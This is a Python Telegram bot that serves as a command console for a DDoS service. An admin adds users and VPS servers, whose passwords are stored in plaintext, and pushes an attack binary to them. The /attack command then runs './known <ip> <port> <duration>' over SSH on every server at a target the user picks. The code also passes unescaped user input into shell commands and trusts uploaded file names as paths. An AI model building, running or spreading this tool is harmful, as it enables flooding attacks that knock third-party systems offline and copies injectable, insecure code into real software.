import asyncio
import paramiko
import os
from telegram import Update, InputFile, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackContext, filters

# Telegram Bot Token
TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN'
ADMIN_USER_ID = 5759284972  # Replace with your actual Telegram ID

# Storage for users and VPS details
USERS_FILE = 'users.txt'
VPS_FILE = 'vps_list.txt'

# Load users
users = set()
if os.path.exists(USERS_FILE):
    with open(USERS_FILE, "r") as f:
        users.update(f.read().splitlines())

# Load VPS list
VPS_LIST = []
if os.path.exists(VPS_FILE):
    with open(VPS_FILE, "r") as f:
        for line in f.readlines():
            ip, user, password = line.strip().split(',')
            VPS_LIST.append({"ip": ip, "user": user, "password": password})

# Helper Function: SSH Command Execution
def ssh_command(vps, command):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(vps["ip"], username=vps["user"], password=vps["password"])
        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode() + stderr.read().decode()
        client.close()
        return output
    except Exception as e:
        return f"Error: {str(e)}"

# Helper Function: Upload File to VPS
def upload_file_to_vps(vps, file_path, remote_path):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(vps["ip"], username=vps["user"], password=vps["password"])
        sftp = client.open_sftp()
        sftp.put(file_path, remote_path)
        sftp.close()
        client.close()
        return f"✅ Uploaded to {vps['ip']}"
    except Exception as e:
        return f"❌ Error uploading to {vps['ip']}: {str(e)}"

# Command: Start
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    if user_id == str(ADMIN_USER_ID):
        await context.bot.send_message(chat_id, "👑 *Admin Commands:*\n"
                                               "/add_user <user_id>\n"
                                               "/remove_user <user_id>\n"
                                               "/add_vps <ip> <user> <pass>\n"
                                               "/remove_vps <ip>\n"
                                               "/upload_file (Send File)\n"
                                               "/attack <ip> <port> <duration>\n",
                                       parse_mode="Markdown")
    elif user_id in users:
        await context.bot.send_message(chat_id, "🔹 Welcome, you can use:\n/attack <ip> <port> <duration>", parse_mode="Markdown")
    else:
        await context.bot.send_message(chat_id, "⚠️ You are not authorized. Contact the admin.")

# Command: Add User
async def add_user(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_USER_ID:
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /add_user <user_id>")
        return
    user_id = context.args[0]
    users.add(user_id)
    with open(USERS_FILE, "a") as f:
        f.write(user_id + "\n")
    await update.message.reply_text(f"✅ User {user_id} added.")

# Command: Remove User
async def remove_user(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_USER_ID:
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove_user <user_id>")
        return
    user_id = context.args[0]
    if user_id in users:
        users.remove(user_id)
        with open(USERS_FILE, "w") as f:
            f.writelines([u + "\n" for u in users])
        await update.message.reply_text(f"✅ User {user_id} removed.")
    else:
        await update.message.reply_text(f"❌ User {user_id} not found.")

# Command: Add VPS
async def add_vps(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_USER_ID:
        return
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /add_vps <ip> <user> <password>")
        return
    ip, user, password = context.args
    VPS_LIST.append({"ip": ip, "user": user, "password": password})
    with open(VPS_FILE, "a") as f:
        f.write(f"{ip},{user},{password}\n")
    await update.message.reply_text(f"✅ VPS {ip} added.")

# Command: Remove VPS
async def remove_vps(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_USER_ID:
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /remove_vps <ip>")
        return
    ip = context.args[0]
    VPS_LIST[:] = [vps for vps in VPS_LIST if vps["ip"] != ip]
    with open(VPS_FILE, "w") as f:
        for vps in VPS_LIST:
            f.write(f"{vps['ip']},{vps['user']},{vps['password']}\n")
    await update.message.reply_text(f"✅ VPS {ip} removed.")

# Command: Upload File to All VPS
async def upload_file(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_USER_ID:
        return
    if not update.message.document:
        await update.message.reply_text("⚠️ Please upload a file.")
        return

    file = await update.message.document.get_file()
    file_path = f"./{update.message.document.file_name}"
    await file.download_to_drive(file_path)

    remote_path = f"/root/{update.message.document.file_name}"
    results = [upload_file_to_vps(vps, file_path, remote_path) for vps in VPS_LIST]

    await update.message.reply_text("\n".join(results))

# Command: Attack
async def attack(update: Update, context: CallbackContext):
    if str(update.effective_user.id) not in users:
        await update.message.reply_text("⚠️ Unauthorized.")
        return
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <duration>")
        return
    ip, port, duration = context.args
    command = f"./known {ip} {port} {duration}"
    results = [ssh_command(vps, command) for vps in VPS_LIST]
    await update.message.reply_text("\n".join(results))

# Main Function
def main():
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("add_user", add_user))
    app.add_handler(CommandHandler("remove_user", remove_user))
    app.add_handler(CommandHandler("add_vps", add_vps))
    app.add_handler(CommandHandler("remove_vps", remove_vps))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(MessageHandler(filters.Document.ALL, upload_file))

    app.run_polling()

if __name__ == "__main__":
    main()

